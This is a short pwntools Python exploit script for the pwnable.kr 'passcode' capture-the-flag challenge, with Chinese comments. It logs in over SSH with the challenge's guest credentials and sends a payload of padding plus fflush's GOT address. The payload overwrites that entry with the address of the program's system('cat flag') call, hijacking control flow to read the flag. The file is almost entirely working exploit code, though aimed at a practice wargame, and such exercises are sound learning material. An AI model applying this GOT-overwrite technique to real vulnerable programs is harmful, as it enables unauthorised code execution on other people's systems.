from pwn import *
context.log_level = "debug"
    
s = ssh(host = 'pwnable.kr', user = 'passcode', port = 2222, password = 'guest')
r = s.process('./passcode')
#r = process("/media/sf_CTF/pwnable.kr/4_passcode/passcode")
#gdb.attach(r)

fflush_got = 0x804a004
sys_cat_flag = 0x80485e3

payload = flat('A'*0x60, fflush_got, str(sys_cat_flag)) 
#用python3會報錯.因為不能有str

f = open("./payload_demo", "wb")
f.write(payload)
f.close()

r.sendline(payload)
#welcome只會吃到fflush_got,str(sys_cat_flag)會被放在stdin中,
#login執行scanf時不需要輸入就會直接先吃進去stdin的東西
r.interactive()
